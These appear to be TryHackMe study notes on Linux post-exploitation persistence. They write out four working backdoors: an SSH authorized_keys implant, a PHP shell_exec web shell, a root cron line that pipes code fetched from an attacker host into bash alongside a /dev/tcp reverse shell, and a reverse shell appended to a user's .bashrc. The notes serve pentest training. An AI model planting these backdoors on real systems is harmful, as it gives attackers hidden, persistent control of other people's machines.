#linux #thm #pentest #post-exploitation

---

# SSH Backdoors

- The ssh backdoor essentially consists of leaving our ssh keys in some user’s home directory.
	- Usually the user would be root as it’s the user with the highest privileges.

- Firstly, we generate ssh keys with `ssh-keygen`
	- ![[Pasted image 20250808061932.png]]

- We leave the public key n /root/.ssh/ 
	- We have to rename our public key to **authorized_keys**
	  
	- The private key is which we use to connect back to ssh on the victim's host. 
	  Give the private key the right permissions using : chmod 600 id_rsa
	  
	- After giving the key the right permissions, we can do : 
		  `"ssh -i id_rsa root@ip"` to login into our desired machine!
		

> This backdoor isn't hidden at all. Anybody with the right permissions would be able to remove our ssh public key or the file authorized_keys entirely.

---

# PHP Backdoors

- If you get root access on a Linux host, you will most likely search for creds and or any useful information in the **web root**.
  
- The web root is usually located in : `/var/www/html`
	-  What you have to know is that, whatever you leave in `/var/www/html`, will be available for everybody to use in their browser.


- Now we can create this php file...
```php
<?php  
	    if (isset($_REQUEST['cmd'])) {  
	        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";  
	    }  
	?>
```


> Notice that we are using : "$_REQUEST['cmd'])", which means that you can pass that parameter either in GET or in POST data.

---

# CronJob Backdoors

- **_Cronjob_** - a scheduled task defined on a Linux system to execute automatically based on predefined parameters such as time intervals or user actions.
	- Cronjob file is here - `/etc/crontab`

- `"m and h"` - Those are the letters that indicate if the task should run every hour or every minute.
	- If `'*'` is under 'h', then cronjob will run every hour, else, it will run every minute

- Add this line into our cronjob file :
	- `* *     * * *   root    curl http://<yourip>:8080/shell | bash`
	  
	- Notice that we put a "*" star symbol to everything. This means that our task will run every minute, every hour, every day , etc .

- The contents of the "shell" file that we are using are simply :

```bash
#!/bin/bash

bash -i >& /dev/tcp/ip/port 0>&1
```

> Please note that this backdoor isn't really hidden because everyone can see it just by looking inside /etc/crontab.


---

# .bashrc Backdoors

- The `.bashrc` file is a hidden configuration file in Linux and other Unix-like operating systems that is used by the Bash shell. 
	- Its primary purpose is to store user-specific configurations and commands that are executed every time a new interactive Bash shell session is opened.

- So If you know any users that log on to their system quite often, you could simply run this command to include your reverse shell into their ".bashrc".
	-  `echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc`

> One important thing is to always have your nc listener ready as you don't know when your user will log on.

===This attack is very sneaky as nobody really thinks about ever checking their ".bashrc" file.===

---

A good resource that I found really helpful when creating this room is: [link](https://airman604.medium.com/9-ways-to-backdoor-a-linux-box-f5f83bae5a3c)